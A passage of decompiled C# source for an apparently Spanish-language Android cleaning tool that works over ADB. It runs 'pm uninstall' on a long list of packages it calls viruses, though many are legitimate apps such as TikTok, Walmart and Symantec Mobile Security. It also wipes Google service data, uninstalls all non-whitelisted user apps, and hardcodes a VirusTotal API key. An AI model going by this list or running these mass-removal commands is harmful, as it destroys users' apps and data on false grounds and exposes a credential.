					"com.siptrtracker.yummo"
				},
				{
					"SmartNews",
					"jp.gocro.smartnews.android"
				},
				{
					"Solitaire (TripleDot)",
					"com.tripledot.solitaire"
				},
				{
					"Soundryt Music",
					"com.soundryt.music"
				},
				{
					"Speed Booster",
					"com.boost.speedphone"
				},
				{
					"Sport City App",
					"com.sportcity.sportcity"
				},
				{
					"Status Saver",
					"com.aminesk.statussaver"
				},
				{
					"Super Battery Saver",
					"com.batterysaver.super"
				},
				{
					"Super Cleaner",
					"com.cleaner.superclean"
				},
				{
					"Sweet Selfie Lite",
					"sweet.selfie.lite"
				},
				{
					"Thief Puzzle",
					"com.weegoon.thiefpuzzle"
				},
				{
					"TikTok (Musically)",
					"com.zhiliaoapp.musically"
				},
				{
					"TikTok GO",
					"com.zhiliaoapp.musically.go"
				},
				{
					"Tricky Lines",
					"com.tricky.lines"
				},
				{
					"Verizon MIPS",
					"com.verizon.mips.services"
				},
				{
					"Verizon OBD",
					"com.verizon.obdmobile"
				},
				{
					"Virus Cleaner 2024",
					"com.antivirus.cleaner"
				},
				{
					"Walmart",
					"com.walmart.mg"
				},
				{
					"Weather Forecast",
					"com.dailyforecast.weather"
				},
				{
					"Weather Home",
					"com.tul.weatherapp"
				},
				{
					"WeStretch",
					"com.weBananas.weStretch"
				},
				{
					"WhatsApp Business",
					"com.whatsapp.w4b"
				},
				{
					"Wikiloc",
					"com.wikiloc.wikilocandroid"
				},
				{
					"Wish",
					"com.contextlogic.wish"
				},
				{
					"Woodoku (TripleDot)",
					"com.tripledot.woodoku"
				},
				{
					"battleblades",
					"com.baset.battleblades"
				},
				{
					"Word Search (PlaySimple)",
					"in.playsimple.wordsearch"
				},
				{
					"ScaleUp PlantID",
					"com.scaleup.plantid"
				},
				{
					"MM Android DMSS",
					"com.mm.android.DMSS"
				},
				{
					"Forecast Weather Severe Wind",
					"com.forecast.weather.severe.wind"
				},
				{
					"Google Duo",
					"com.google.android.apps.tachyon"
				},
				{
					"Alibaba Poseidon",
					"com.alibaba.intl.android.apps.poseidon"
				},
				{
					"Meeting Transcriber",
					"com.codespaceapps.meetingtranscriber"
				},
				{
					"Starkey NewLink",
					"com.starkey.android.newlink.release"
				},
				{
					"Mix VPN",
					"com.mix.vpn"
				},
				{
					"All Document Explorer",
					"com.alldocumentexplor.ade"
				},
				{
					"PDF Reader Editor Free",
					"com.pdfreader.pdfeditor.pdfreadeforandroid.pdfeditorforandroidfree"
				},
				{
					"DOCX Reader WordOffice",
					"com.docxreader.documentreader.wordoffice"
				},
				{
					"HT Routine PlanApp 2023",
					"com.htroutine2023.planapp"
				},
				{
					"Clean Planner",
					"com.cleanplanner"
				},
				{
					"Local Weather Radar Climate",
					"com.localweather.radar.climate"
				},
				{
					"FillPDF Editor PDFSign",
					"com.fillpdf.pdfeditor.pdfsign"
				},
				{
					"WSAndroid Suite",
					"com.wsandroid.suite"
				},
				{
					"DigitalFEMSA SpinPlus",
					"com.digitalfemsa_spinplus"
				},
				{
					"NFA Distance Meter",
					"com.nfa.distancemeter"
				},
				{
					"EZT PDF Reader Viewer",
					"com.ezt.pdfreader.pdfviewer"
				},
				{
					"CMU CleanMaster New",
					"cmu.cleanmaster.new.app"
				},
				{
					"ColorOS Translate",
					"com.coloros.translate"
				},
				{
					"Google ADM",
					"com.google.android.apps.adm"
				},
				{
					"Magical Smart Alban",
					"com.magical.smart.alban"
				},
				{
					"Document FilePro",
					"com.document.filepro"
				},
				{
					"Symantec Mobile Security",
					"com.symantec.mobilesecurity"
				},
				{
					"DMobileApps BarcodeScanner",
					"com.dmobileapps.barcodescanner"
				},
				{
					"OldOnch DeviceGuru",
					"com.oldonch.deviceguru"
				},
				{
					"MCPC Cleaner",
					"mc.mcpc.cleaner"
				},
				{
					"PDF Reader Viewer All Docs",
					"pdf.reader.pdf.viewer.all.document.reader.office.viewer"
				},
				{
					"Document Reader OfficeViewer",
					"documentreader.officeviewer.filereader.all.doc"
				},
				{
					"PDF Reader PDFViewer Free",
					"pdfreader.pdfviewer.free.officetool"
				},
				{
					"Eyalin DeviceDetailsHEB",
					"eyalin.mydevicedetailsheb"
				},
				{
					"EZPDF Reader Editor",
					"com.ezpdf.read.view.editor.pdfreader.pdfviewer"
				},
				{
					"Samsung Reminder",
					"com.samsung.android.app.reminder"
				},
				{
					"Samsung VOC",
					"com.samsung.android.voc"
				},
				{
					"Samsung Tips",
					"com.samsung.android.app.tips"
				},
				{
					"Samsung Find",
					"com.samsung.android.app.find"
				},
				{
					"Samsung S Page",
					"com.samsung.android.app.spage"
				},
				{
					"Samsung OneConnect",
					"com.samsung.android.oneconnect"
				},
				{
					"Samsung Watch Manager",
					"com.samsung.android.app.watchmanager"
				},
				{
					"Samsung Members Wallet",
					"com.samsung.memberswallet"
				},
				{
					"Samsung AR Zone",
					"com.samsung.android.arzone"
				},
				{
					"Samsung SREE",
					"com.samsung.sree"
				},
				{
					"Samsung Game Home",
					"com.samsung.android.game.gamehome"
				},
				{
					"Samsung Browser",
					"com.sec.android.app.sbrowser"
				},
				{
					"Shake Shack MX",
					"com.shakeshackmx.shackapp"
				},
				{
					"Blood Pressure Health App",
					"com.blood.pressure.healthapp"
				},
				{
					"Block Juggle",
					"com.block.juggle"
				},
				{
					"Quizlet",
					"com.quizlet.quizletandroid"
				},
				{
					"X Photo Kit",
					"com.xphotokit.app"
				},
				{
					"Ultra Recovery Core",
					"com.ultrarecovery.core"
				},
				{
					"CleanGAN GuruNM",
					"com.cleangan.gurunm"
				},
				{
					"VitaStudio Mahjong",
					"com.vitastudio.mahjong"
				},
				{
					"Samsung Kids Home",
					"com.sec.android.app.kidshome"
				},
				{
					"ShortEgo Drama Reels",
					"com.shortego.dramareels"
				},
				{
					"Tile Trip",
					"com.oakever.tiletrip"
				},
				{
					"ClearSense Cleaning",
					"com.clearsense.cleaning"
				},
				{
					"Unico Studio BallTubes",
					"com.unicostudio.balltubes"
				},
				{
					"AliExpress HD",
					"com.alibaba.aliexpresshd"
				},
				{
					"Cycle Recorder Heal",
					"com.fem.cycle.recorderheal"
				},
				{
					"Network Search",
					"info.lamatricexiste.networksearch"
				},
				{
					"SnapArt",
					"net.diflib.snapart"
				},
				{
					"AI Character App",
					"ai.character.app"
				},
				{
					"DocReader OfficeViewer All",
					"all.documentreader.filereader.office.viewer"
				},
				{
					"Sticker Studio StickTok",
					"com.stickerstudio.sticktok"
				},
				{
					"Native Messages",
					"com.native.messages"
				},
				{
					"HFest",
					"fp.ftakhv.hfest"
				},
				{
					"Fotostrana SweetMeet",
					"ru.fotostrana.sweetmeet"
				},
				{
					"Contacts PhoneCall",
					"com.contacts.phonecall"
				},
				{
					"Samsung Notes Addons",
					"com.samsung.android.app.notes.addons"
				},
				{
					"HiFun Drama Video",
					"com.hifun.drama.video"
				},
				{
					"Tala MX",
					"mx.com.tala"
				},
				{
					"EverMatch",
					"com.evermatch"
				},
				{
					"NatureClear Elenta Cleaner",
					"com.natureclear.elenta.cleaner"
				},
				{
					"MailTime Android",
					"com.mailtime.android"
				},
				{
					"Amazon Flex Rabbit",
					"com.amazon.flex.rabbit"
				},
				{
					"Crunchyroll Android",
					"com.crunchyroll.crunchyroid"
				},
				{
					"Procesar AforeMovil",
					"mx.com.procesar.aforemovil"
				},
				{
					"Education H Intelligence",
					"com.education.android.h.intelligence"
				},
				{
					"Goal Cleaner",
					"com.cleaner.goal"
				},
				{
					"Casaley App",
					"mx.com.casaley.app"
				},
				{
					"MusicPlayer Music",
					"com.musicplayer.music"
				},
				{
					"PagosDigitales PDMovil",
					"com.pagosdigitales.pdmovil"
				},
				{
					"Samsung Galaxy",
					"com.samsung.android.galaxy"
				},
				{
					"Televisa IZZI",
					"telecom.televisa.com.izzi"
				},
				{
					"Google IMS",
					"com.google.android.ims"
				},
				{
					"iContact Contacts Handler",
					"com.contacts.icontact.contactshandler"
				},
				{
					"Samsung Health Service",
					"com.samsung.android.service.health"
				},
				{
					"ITQR Goodman",
					"com.ithahaqr.itqrgoodman.qrwov"
				},
				{
					"WIMM MX ATT",
					"mx.wimmx.att"
				},
				{
					"PlayMusic AudioPlayer",
					"musicplayer.playmusic.audioplayer"
				},
				{
					"iHappyDate",
					"com.ihappydate"
				},
				{
					"Panda Likerro",
					"com.panda.likerro"
				},
				{
					"Ball Sort Puzzle",
					"ball.sort.puzzle.color.sorting.bubble.games"
				}
			};
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x0000B17C File Offset: 0x0000937C
		private void btnCleanVirusOffline_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ListView1.Visible = false;
				this.txtOutput.Clear();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				Task.Run(delegate()
				{
					try
					{
						List<string> adbDevices = this.GetAdbDevices();
						bool flag2 = adbDevices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
						if (flag2)
						{
							MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
							return;
						}
						string selectedDevice = "";
						this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
						{
							selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						}));
						this.txtOutput.Clear();
						this.txtOutput.AppendText("Operation : Clean Virus" + Environment.NewLine);
						this.txtOutput.AppendText("Remove Method : Adb offline bd1" + Environment.NewLine + Environment.NewLine);
						this.LeerInformacionAdbPorMarca(selectedDevice);
						this.txtOutput.AppendText(Environment.NewLine);
						this.LimpiarGoogleServices(selectedDevice);
						this.EliminarVirusDetectados("Eliminación de posibles virus", selectedDevice);
						this.GuardarLog(selectedDevice, "Clean Virus", this.txtOutput);
						string text = this.txtOutput.Text;
						this.GuardarLogEnFirebase(text);
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error en el proceso: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.UpdateProgressBar();
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				});
			}
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x0000B210 File Offset: 0x00009410
		public void EliminarVirusDetectados(string nombreProceso, string selectedDevice)
		{
			try
			{
				Dictionary<string, string> dictionary = this.ObtenerDiccionarioVirus();
				List<string> list = new List<string>();
				this.txtOutput.AppendText(Environment.NewLine + string.Format("\ud83e\uddf9 Iniciando limpieza de virus ({0})...", nombreProceso) + Environment.NewLine);
				try
				{
					foreach (KeyValuePair<string, string> keyValuePair in dictionary)
					{
						string key = keyValuePair.Key;
						string value = keyValuePair.Value;
						string text = this.ExecuteAdbCommand(string.Format("shell pm list packages {0}", value), selectedDevice);
						bool flag = text.Contains(value);
						if (flag)
						{
							string text2 = this.ExecuteAdbCommand(string.Format("shell pm uninstall --user 0 {0}", value), selectedDevice);
							list.Add(string.Format("\ud83d\uddd1️ Eliminado: {0} ({1}) → {2}", key, value, text2.Trim()));
						}
					}
				}
				finally
				{
					Dictionary<string, string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				bool flag2 = list.Count > 0;
				if (flag2)
				{
					try
					{
						foreach (string str in list)
						{
							this.txtOutput.AppendText(str + Environment.NewLine);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator2;
						((IDisposable)enumerator2).Dispose();
					}
					this.txtOutput.AppendText("✅ Process : Clean Virus Adb offline bd1 - completado." + Environment.NewLine);
				}
				else
				{
					this.txtOutput.AppendText("✅ Process : Clean Virus Adb offline bd1 - completado. No se encontraron apps en bdv1 para eliminar." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al eliminar virus: " + ex.Message);
			}
		}

		// Token: 0x060000BA RID: 186 RVA: 0x0000B3F8 File Offset: 0x000095F8
		public void LimpiarGoogleServices(string selectedDevice)
		{
			try
			{
				Dictionary<string, string> dictionary = this.ObtenerDiccionarioGoogleServices();
				List<string> list = new List<string>();
				this.txtOutput.AppendText(Environment.NewLine + "\ud83e\uddfc Iniciando limpieza de Google Services..." + Environment.NewLine);
				try
				{
					foreach (KeyValuePair<string, string> keyValuePair in dictionary)
					{
						string key = keyValuePair.Key;
						string value = keyValuePair.Value;
						string text = this.ExecuteAdbCommand(string.Format("shell pm clear --user 0 {0}", value), selectedDevice);
						list.Add(string.Format("\ud83d\udd04 Limpieza: {0} → {1}", key, text.Trim()));
					}
				}
				finally
				{
					Dictionary<string, string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				try
				{
					foreach (string str in list)
					{
						this.txtOutput.AppendText(str + Environment.NewLine);
					}
				}
				finally
				{
					List<string>.Enumerator enumerator2;
					((IDisposable)enumerator2).Dispose();
				}
				this.txtOutput.AppendText("✅ Limpieza de Google Services finalizada." + Environment.NewLine);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al limpiar bloatware: " + ex.Message);
			}
		}

		// Token: 0x060000BB RID: 187 RVA: 0x0000B584 File Offset: 0x00009784
		private Dictionary<string, string> ObtenerDiccionarioGoogleServices()
		{
			return new Dictionary<string, string>
			{
				{
					"Play Store",
					"com.android.vending"
				},
				{
					"Chrome",
					"com.android.chrome"
				},
				{
					"Android WebView",
					"com.google.android.webview"
				},
				{
					"Google Play Services",
					"com.google.android.gms"
				},
				{
					"Google AR Core",
					"com.google.ar.core"
				},
				{
					"Google Feedback",
					"com.google.android.feedback"
				},
				{
					"Google Partner Setup",
					"com.google.android.partnersetup"
				},
				{
					"GMS Location History",
					"com.google.android.gms.location.history"
				},
				{
					"Google SafetyCore",
					"com.google.android.safetycore"
				},
				{
					"Google Wellbeing",
					"com.google.android.apps.wellbeing"
				},
				{
					"Google Assistant",
					"com.google.android.apps.googleassistant"
				},
				{
					"Samsung OMC Agent",
					"com.samsung.android.app.omcagent"
				}
			};
		}

		// Token: 0x060000BC RID: 188 RVA: 0x0000B668 File Offset: 0x00009868
		public void EliminarAppsUsuarioConFiltro(string nombreProceso, string selectedDevice)
		{
			try
			{
				this.txtOutput.AppendText(Environment.NewLine + string.Format("\ud83e\uddf9 Iniciando limpieza filtrada de apps de usuario ({0})...", nombreProceso) + Environment.NewLine);
				string text = this.ExecuteAdbCommand("shell pm list packages -3", selectedDevice);
				bool flag = string.IsNullOrWhiteSpace(text);
				if (flag)
				{
					this.txtOutput.AppendText("⚠️ No se pudieron obtener las apps de usuario." + Environment.NewLine);
				}
				else
				{
					string[] array = text.Split(new string[]
					{
						Environment.NewLine
					}, StringSplitOptions.RemoveEmptyEntries);
					List<string> list = new List<string>
					{
						"com.whatsapp",
						"com.facebook.katana",
						"com.instagram.android",
						"com.ubercab",
						"com.google.android.youtube",
						"com.google.android.apps.messaging",
						"com.google.android.dialer",
						"com.google.android.contacts",
						"com.google.android.apps.maps",
						"com.google.android.gm",
						"com.google.android.calendar",
						"com.google.android.apps.photos"
					};
					List<string> list2 = new List<string>();
					List<string> list3 = new List<string>();
					foreach (string text2 in array)
					{
						string text3 = text2.Replace("package:", "").Trim();
						bool flag2 = string.IsNullOrEmpty(text3);
						if (!flag2)
						{
							bool flag3 = list.Contains(text3);
							if (flag3)
							{
								list3.Add(string.Format("\ud83d\udeab Omitido (permitido por lista blanca): {0}", text3));
							}
							else
							{
								string text4 = this.ExecuteAdbCommand(string.Format("shell pm uninstall --user 0 {0}", text3), selectedDevice);
								list2.Add(string.Format("\ud83d\uddd1️ Eliminado: {0} → {1}", text3, text4.Trim()));
							}
						}
					}
					try
					{
						foreach (string str in list2)
						{
							this.txtOutput.AppendText(str + Environment.NewLine);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					try
					{
						foreach (string str2 in list3)
						{
							this.txtOutput.AppendText(str2 + Environment.NewLine);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator2;
						((IDisposable)enumerator2).Dispose();
					}
					this.txtOutput.AppendText("✅ Limpieza filtrada finalizada." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al eliminar apps de usuario filtradas: " + ex.Message);
			}
		}

		// Token: 0x060000BD RID: 189 RVA: 0x0000B960 File Offset: 0x00009B60
		private void btnConsultarVirusOnlineSolo_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.InitializeProgressBar(2);
			Task.Run(async delegate()
			{
				try
				{
					List<string> devices = this.GetAdbDevices();
					bool flag = devices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
					if (flag)
					{
						this.Invoke((Form1._Closure$__.$I150-2 == null) ? (Form1._Closure$__.$I150-2 = delegate()
						{
							MessageBox.Show("Conecta un dispositivo.");
						}) : Form1._Closure$__.$I150-2);
						return;
					}
					string selectedDevice = "";
					this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					}));
					string apiKey = "65f4e69469a2af7fa50b0ed5c06fb88e5a998940dda28eb5286603533b28125d";
					await this.ConsultarVirusOnlineSinEliminar(selectedDevice, apiKey);
				}
				catch (Exception $VB$Local_ex)
				{
					Exception ex = $VB$Local_ex;
					this.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						MessageBox.Show("Error: " + ex.Message);
					}));
				}
				this.UpdateProgressBar();
			});
		}

		// Token: 0x060000BE RID: 190 RVA: 0x0000B984 File Offset: 0x00009B84
		public async Task ConsultarVirusOnlineSinEliminar(string selectedDevice, string apiKey)
		{
			string rutaLogs = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
			bool flag = !Directory.Exists(rutaLogs);
			if (flag)
			{
				Directory.CreateDirectory(rutaLogs);
			}
			string rutaArchivo = Path.Combine(rutaLogs, "cosultar_virus_online_sin_eliminar_log.txt");
			this.txtOutput.AppendText(Environment.NewLine + "\ud83c\udf10 Escaneando y eliminando posibles amenazas desde VirusTotal..." + Environment.NewLine);
			File.AppendAllText(rutaArchivo, string.Format("{0}\ud83d\udd0d {1} - Escaneo con eliminación para: {2}{3}", new object[]
			{
				Environment.NewLine,
				DateAndTime.Now,
				selectedDevice,
				Environment.NewLine
			}));
			string resultado = this.ExecuteAdbCommand("shell pm list packages", selectedDevice);
			string[] paquetes = resultado.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries);
			int totalRevisadas = 0;
			int limpias = 0;
			List<string> eliminadas = new List<string>();
			int errores = 0;
			checked
			{
				foreach (string linea in paquetes)
				{
					string paquete = linea.Replace("package:", "").Trim();
					bool flag2 = string.IsNullOrWhiteSpace(paquete);
					if (!flag2)
					{
						totalRevisadas++;
						string rutaRemota = this.ExecuteAdbCommand(string.Format("shell pm path {0}", paquete), selectedDevice);
						bool flag3 = !rutaRemota.Contains("package:");
						if (flag3)
						{
							this.txtOutput.AppendText(string.Format("⚠️ No se encontró ruta para: {0}", paquete) + Environment.NewLine);
							errores++;
						}
						else
						{
							string apkPath = rutaRemota.Replace("package:", "").Trim();
							string apkLocal = Path.Combine(Path.GetTempPath(), string.Format("{0}.apk", paquete));
							this.ExecuteAdbCommand(string.Format("pull {0} \"{1}\"", apkPath, apkLocal), selectedDevice);
							bool flag4 = !File.Exists(apkLocal);
							if (flag4)
							{
								this.txtOutput.AppendText(string.Format("❌ No se pudo extraer el APK: {0}", apkPath) + Environment.NewLine);
								errores++;
							}
							else
							{
								string sha256 = this.CalcularSHA256(apkLocal);
								this.txtOutput.AppendText(string.Format("\ud83d\udd11 SHA256 generado para {0}: {1}", paquete, sha256) + Environment.NewLine);
								File.AppendAllText(rutaArchivo, string.Format("\ud83d\udd11 SHA256 {0}: {1}", paquete, sha256) + Environment.NewLine);
								File.Delete(apkLocal);
								bool flag5 = string.IsNullOrWhiteSpace(sha256);
								if (flag5)
								{
									this.txtOutput.AppendText(string.Format("❌ SHA256 inválido para: {0}", paquete) + Environment.NewLine);
									errores++;
								}
								else
								{
									Form1.VirusAnalysisResult analisis = await this.ConsultarVirusTotalDetallesSHA256(sha256, apiKey);
									if (analisis == null)
									{
										this.txtOutput.AppendText(string.Format("❌ No se pudo consultar VirusTotal para: {0}", paquete) + Environment.NewLine);
										errores++;
									}
									else if (analisis.IsThreat)
									{
										eliminadas.Add(paquete);
										this.AppendColoredText(this.txtOutput, string.Format("☣️ Amenaza detectada: {0}", paquete), Color.Red);
										this.txtOutput.AppendText(string.Format("\ud83d\udd11 SHA256: {0}", sha256) + Environment.NewLine);
										this.txtOutput.AppendText(string.Format("\ud83d\udcca Motores: Maliciosos={0}, Sospechosos={1}, No detectados={2}", analisis.Malicious, analisis.Suspicious, analisis.Undetected) + Environment.NewLine);
										File.AppendAllText(rutaArchivo, string.Format("☣️ {0} | SHA256: {1} | Malicious={2} | Suspicious={3} | Undetected={4}{5}", new object[]
										{
											paquete,
											sha256,
											analisis.Malicious,
											analisis.Suspicious,
											analisis.Undetected,
											Environment.NewLine
										}));
									}
									else
									{
										limpias++;
										this.AppendColoredText(this.txtOutput, string.Format("✔️ Limpio: {0}", paquete), Color.Green);
									}
								}
							}
						}
					}
				}
				this.txtOutput.AppendText(Environment.NewLine + "\ud83d\udcca Resumen del escaneo:" + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("\ud83d\udd0d Revisadas: {0}", totalRevisadas) + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("✔️ Limpias: {0}", limpias) + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("\ud83d\uddd1️ Eliminadas/Desactivadas: {0}", eliminadas.Count) + Environment.NewLine);
				this.txtOutput.AppendText(string.Format("❌ Errores / no procesadas: {0}", errores) + Environment.NewLine);
				File.AppendAllText(rutaArchivo, Environment.NewLine + "✅ Fin del escaneo con eliminación." + Environment.NewLine);
			}
		}

		// Token: 0x060000BF RID: 191 RVA: 0x0000B9D8 File Offset: 0x00009BD8
		public async Task<bool> ConsultarVirusTotal(string packageName, string apiKey)
		{
			try
			{
				using (HttpClient client = new HttpClient())
				{
					client.DefaultRequestHeaders.Add("x-apikey", apiKey);
					string searchUrl = string.Format("https://www.virustotal.com/api/v3/search?query=package:{0}", packageName);
					HttpResponseMessage searchResponse = await client.GetAsync(searchUrl);
					if (!searchResponse.IsSuccessStatusCode)
					{
						return false;
					}
					string searchJson = await searchResponse.Content.ReadAsStringAsync();
					JObject searchData = JObject.Parse(searchJson);
					JToken jtoken = searchData["data"];
					string text;
					if (jtoken == null)
					{
						text = null;
					}
					else
					{
						JToken first = jtoken.First;
						if (first == null)
						{
							text = null;
						}
						else
						{
							JToken jtoken2 = first["id"];
							text = ((jtoken2 != null) ? jtoken2.ToString() : null);
						}
					}
					string sha256 = text;
					if (string.IsNullOrEmpty(sha256))
					{
						return false;
					}
					string fileUrl = string.Format("https://www.virustotal.com/api/v3/files/{0}", sha256);
					HttpResponseMessage fileResponse = await client.GetAsync(fileUrl);
					if (!fileResponse.IsSuccessStatusCode)
					{
						return false;
					}
					string fileJson = await fileResponse.Content.ReadAsStringAsync();
					JObject data = JObject.Parse(fileJson);
					JToken jtoken3 = data["data"];
					int? num;
					if (jtoken3 == null)
					{
						num = null;
					}
					else
					{
						JToken jtoken4 = jtoken3["attributes"];
						if (jtoken4 == null)
						{
							num = null;
						}
						else
						{
							JToken jtoken5 = jtoken4["last_analysis_stats"];
							if (jtoken5 == null)
							{
								num = null;
							}
							else
							{
								JToken jtoken6 = jtoken5["malicious"];
								num = ((jtoken6 != null) ? new int?(jtoken6.ToObject<int>()) : null);
							}
						}
					}
					int? malicious = num;
					JToken jtoken7 = data["data"];
					int? num2;
					if (jtoken7 == null)
					{
						num2 = null;
					}
					else
					{
						JToken jtoken8 = jtoken7["attributes"];
						if (jtoken8 == null)
						{
							num2 = null;
						}
						else
						{
							JToken jtoken9 = jtoken8["last_analysis_stats"];
							if (jtoken9 == null)
							{
								num2 = null;
							}
							else
							{
								JToken jtoken10 = jtoken9["suspicious"];
								num2 = ((jtoken10 != null) ? new int?(jtoken10.ToObject<int>()) : null);
							}
						}
					}
					int? suspicious = num2;
					if ((malicious != null && malicious.Value > 0) || (suspicious != null && suspicious.Value > 0))
					{
						return true;
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText(string.Format("❌ Error al consultar {0}: {1}", packageName, ex.Message) + Environment.NewLine);
			}
			return false;
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x0000BA2A File Offset: 0x00009C2A
		private void btnConsultarYEliminarVirusOnline_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.InitializeProgressBar(2);
			Task.Run(async delegate()
			{
				try
				{
					List<string> devices = this.GetAdbDevices();
					bool flag = devices.Count == 0 || this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_1<object>(() => this.cmbDevicesAdb.SelectedItem)) == null;
					if (flag)
					{
						this.Invoke((Form1._Closure$__.$I153-2 == null) ? (Form1._Closure$__.$I153-2 = delegate()
						{
							MessageBox.Show("Conecta un dispositivo.");
						}) : Form1._Closure$__.$I153-2);
						return;
					}
					string selectedDevice = "";
					this.cmbDevicesAdb.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
					}));
					string apiKey = "65f4e69469a2af7fa50b0ed5c06fb88e5a998940dda28eb5286603533b28125d";
					await this.ConsultarYEliminarVirusOnline(selectedDevice, apiKey);
				}
				catch (Exception $VB$Local_ex)
				{
					Exception ex = $VB$Local_ex;
					this.Invoke(new VB$AnonymousDelegate_0(delegate()
					{
						MessageBox.Show("Error: " + ex.Message);
					}));
				}
				this.UpdateProgressBar();
			});
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x0000BA50 File Offset: 0x00009C50
		public async Task ConsultarYEliminarVirusOnline(string selectedDevice, string apiKey)
		{
			string rutaLogs = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Logs");
			bool flag = !Directory.Exists(rutaLogs);
			if (flag)
			{
				Directory.CreateDirectory(rutaLogs);
			}
			string rutaArchivo = Path.Combine(rutaLogs, "Consultar_Y_Eliminar_Virus_Online_log.txt");
			this.txtOutput.AppendText(Environment.NewLine + "\ud83c\udf10 Escaneando y eliminando posibles amenazas desde VirusTotal..." + Environment.NewLine);
			File.AppendAllText(rutaArchivo, string.Format("{0}\ud83d\udd0d {1} - Escaneo con eliminación para: {2}{3}", new object[]
			{
				Environment.NewLine,
				DateAndTime.Now,
				selectedDevice,
				Environment.NewLine
			}));
			string resultado = this.ExecuteAdbCommand("shell pm list packages", selectedDevice);
			string[] paquetes = resultado.Split(new string[]
			{
				Environment.NewLine
			}, StringSplitOptions.RemoveEmptyEntries);
			int totalRevisadas = 0;
			int limpias = 0;
			List<string> eliminadas = new List<string>();
			int errores = 0;
			checked
			{
				foreach (string linea in paquetes)
				{
					string paquete = linea.Replace("package:", "").Trim();
					bool flag2 = string.IsNullOrWhiteSpace(paquete);
					if (!flag2)
					{
						totalRevisadas++;
						string rutaRemota = this.ExecuteAdbCommand(string.Format("shell pm path {0}", paquete), selectedDevice);
						bool flag3 = !rutaRemota.Contains("package:");
						if (flag3)
						{
							this.txtOutput.AppendText(string.Format("⚠️ No se encontró ruta para: {0}", paquete) + Environment.NewLine);
							errores++;
						}
						else
						{
							string apkPath = rutaRemota.Replace("package:", "").Trim();
							string apkLocal = Path.Combine(Path.GetTempPath(), string.Format("{0}.apk", paquete));
							this.ExecuteAdbCommand(string.Format("pull {0} \"{1}\"", apkPath, apkLocal), selectedDevice);
							bool flag4 = !File.Exists(apkLocal);
							if (flag4)
							{
								this.txtOutput.AppendText(string.Format("❌ No se pudo extraer el APK: {0}", apkPath) + Environment.NewLine);
								errores++;
							}
							else
							{
								string sha256 = this.CalcularSHA256(apkLocal);
								this.txtOutput.AppendText(string.Format("\ud83d\udd11 SHA256 generado para {0}: {1}", paquete, sha256) + Environment.NewLine);
								File.AppendAllText(rutaArchivo, string.Format("\ud83d\udd11 SHA256 {0}: {1}", paquete, sha256) + Environment.NewLine);
								File.Delete(apkLocal);
								bool flag5 = string.IsNullOrWhiteSpace(sha256);
								if (flag5)
								{
									this.txtOutput.AppendText(string.Format("❌ SHA256 inválido para: {0}", paquete) + Environment.NewLine);
									errores++;
								}
								else
								{
									Form1.VirusAnalysisResult analisis = await this.ConsultarVirusTotalDetallesSHA256(sha256, apiKey);
									if (analisis == null)
									{
										this.txtOutput.AppendText(string.Format("❌ No se pudo consultar VirusTotal para: {0}", paquete) + Environment.NewLine);
										errores++;
									}
									else if (analisis.IsThreat)
									{
										eliminadas.Add(paquete);
										this.AppendColoredText(this.txtOutput, string.Format("☣️ Amenaza detectada: {0}", paquete), Color.Red);
										this.txtOutput.AppendText(string.Format("\ud83d\udd11 SHA256: {0}", sha256) + Environment.NewLine);
										this.txtOutput.AppendText(string.Format("\ud83d\udcca Motores: Maliciosos={0}, Sospechosos={1}, No detectados={2}", analisis.Malicious, analisis.Suspicious, analisis.Undetected) + Environment.NewLine);
										File.AppendAllText(rutaArchivo, string.Format("☣️ {0} | SHA256: {1} | Malicious={2} | Suspicious={3} | Undetected={4}{5}", new object[]
										{
											paquete,
											sha256,
											analisis.Malicious,
